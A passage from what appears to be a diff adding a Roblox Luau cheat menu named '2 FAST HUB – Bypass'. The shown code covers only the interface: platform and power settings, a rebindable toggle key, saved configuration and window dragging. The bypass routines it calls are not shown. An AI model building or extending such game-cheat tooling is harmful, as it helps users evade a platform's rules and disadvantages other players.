+ColorSequenceKeypoint.new(0.50, C.BrightBlue),  
+ColorSequenceKeypoint.new(0.62, C.Blue),  
+ColorSequenceKeypoint.new(1.00, C.DarkBlue),  
+})  
+stopBypass()  
+end  
+activateButton.Text = state and "DEACTIVATE" or "ACTIVATE"  
+end
+local function setPlatform(platform)  
+selectedPlatform = platform  
+highlightPlatform(platform)  
+currentPower = defaultPowers[platform]  
+updatePowerDisplay()  
+if active then startBypass(currentPower) end  
+SaveConfig(boundKey, currentPower, platform)  
+end
+powerInput.FocusLost:Connect(function()  
+local num = tonumber(powerInput.Text)  
+if num and num > 0 then  
+currentPower = math.floor(num)  
+updatePowerDisplay()  
+if active then startBypass(currentPower) end  
+SaveConfig(boundKey, currentPower, selectedPlatform)  
+else  
+powerInput.Text = tostring(currentPower)  
+end  
+end)
+pcBtn.Activated:Connect(function() setPlatform("PC") end)  
+mobileBtn.Activated:Connect(function() setPlatform("MOBILE") end)
+-- Keybind button click: start listening  
+kbButton.Activated:Connect(function()  
+waitingForKey = true  
+kbButton.Text = "[?]"  
+end)
+-- Input handler for keybind change and activation  
+UserInputService.InputBegan:Connect(function(input, gameProcessed)  
+if waitingForKey then  
+local newKey = nil  
+if input.UserInputType == Enum.UserInputType.Keyboard then  
+newKey = input.KeyCode  
+elseif input.UserInputType == Enum.UserInputType.Gamepad1 then  
+newKey = input.KeyCode  
+end  
+if newKey and newKey ~= Enum.KeyCode.Unknown then  
+boundKey = newKey  
+kbButton.Text = "[" .. newKey.Name .. "]"  
+waitingForKey = false  
+SaveConfig(boundKey, currentPower, selectedPlatform)  
+end  
+return  
+end  
+-- Toggle bypass when bound key is pressed (only if not rebinding)  
+if not gameProcessed then  
+if input.UserInputType == Enum.UserInputType.Keyboard or input.UserInputType == Enum.UserInputType.Gamepad1 then  
+if input.KeyCode == boundKey then  
+setActive(not active)  
+end  
+end  
+end  
+end)
+activateButton.Activated:Connect(function() setActive(not active) end)
+activateButton.MouseEnter:Connect(function()  
+local target = active and Color3.fromRGB(50, 150, 255) or C.Card2  
+TweenService:Create(activateButton, TweenInfo.new(0.1), {BackgroundColor3 = target}):Play()  
+end)  
+activateButton.MouseLeave:Connect(function()  
+local target = active and C.Blue or C.Card  
+TweenService:Create(activateButton, TweenInfo.new(0.1), {BackgroundColor3 = target}):Play()  
+end)
+--==================================================  
+-- DRAGGING  
+--==================================================
+local dragging, dragStart, startPos = false, nil, nil  
+main.InputBegan:Connect(function(input)  
+if input.UserInputType == Enum.UserInputType.MouseButton1  
+or input.UserInputType == Enum.UserInputType.Touch then  
+dragging   = true  
+dragStart  = input.Position  
+startPos   = main.Position  
+end  
+end)
+UserInputService.InputChanged:Connect(function(input)  
+if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement  
+or input.UserInputType == Enum.UserInputType.Touch) then  
+local delta  = input.Position - dragStart  
+main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,  
+startPos.Y.Scale, startPos.Y.Offset + delta.Y)  
+end  
+end)
+UserInputService.InputEnded:Connect(function(input)  
+if input.UserInputType == Enum.UserInputType.MouseButton1  
+or input.UserInputType == Enum.UserInputType.Touch then  
+dragging   = false  
+end  
+end)
+--==================================================  
+-- RING ROTATION  
+--==================================================
+RunService.RenderStepped:Connect(function(dt)  
+ringGradient.Rotation = (ringGradient.Rotation + dt * 95) % 360  
+end)
+--==================================================  
+-- INIT  
+--==================================================
+-- Apply saved platform & power  
+highlightPlatform(selectedPlatform)  
+updatePowerDisplay()  
+kbButton.Text = "[" .. boundKey.Name .. "]"  
+setActive(false)  -- start with OFF
+print("2 FAST HUB – Bypass loaded (keybind fixed)")
